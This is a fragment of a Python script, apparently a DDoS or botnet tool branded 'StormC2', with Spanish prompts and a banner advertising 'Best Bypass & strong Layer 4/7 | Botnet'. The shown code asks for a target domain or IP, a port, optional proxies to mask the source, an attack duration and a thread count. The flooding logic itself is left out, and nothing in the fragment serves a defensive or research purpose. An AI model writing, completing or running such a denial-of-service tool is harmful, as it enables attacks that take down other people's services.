...
def print_header():
    print(RED + "-" * 55)
    print("Best Bypass & strong Layer 4/7 | Botnet")
    print("-" * 55)
    print("By bnmpmiv & dealers.xyz")
    print("User Logging: pmiv.")
    print("-" * 55 + RESET + "\n")
...
def main():
    ...
    target = input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} Dominio/IP objetivo: ").strip()
    port = int(input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} Puerto (80/443): ").strip())

    use_proxies = input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} ¿Quieres integrar proxies? S/N: ").strip().lower() == 's'
    proxies = []
    use_local_ip = True
    ...
    if use_proxies:
        ...
        if not proxies:
            ...
            use_local_ip = input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} ¿Quieres usar también tu IP local además de las proxies? S/N: ").strip().lower() == 's'
    else:
        use_local_ip = True  # Si no usa proxies, ataca solo con local IP

    duration = int(input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} Duración del ataque (segundos): ").strip())
    ...
    # Iniciar threads
    thread_count = int(input(f"{RED}[ pmiv • StormC2 ] ▶{RESET} Hilos (threads): ").strip())
    threads = []
